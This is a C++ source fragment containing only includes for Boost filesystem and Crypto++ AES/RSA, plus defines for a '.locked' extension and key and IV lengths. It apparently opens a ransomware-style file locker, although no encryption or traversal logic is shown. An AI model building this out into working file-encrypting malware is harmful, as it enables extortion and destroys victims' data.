#include <boost/filesystem/operations.hpp>
#include <iostream>
#include <string>
#include <vector>
#include <cryptopp/aes.h>
#include <cryptopp/rsa.h>
#include <cryptopp/default.h>
#include <cryptopp/osrng.h>
#include <cryptopp/cryptlib.h>
#include <cryptopp/hex.h>
#include <cryptopp/filters.h>
#include <cryptopp/files.h>
#include <cryptopp/ccm.h>

using namespace boost::filesystem;
using namespace CryptoPP;
using namespace std;

#define LOCKED_EXTENSION ".locked"
// #define KEY_LEN 32 // 256 bits
#define KEY_LEN AES::DEFAULT_KEYLENGTH
#define IV_LEN CryptoPP::AES::BLOCKSIZE
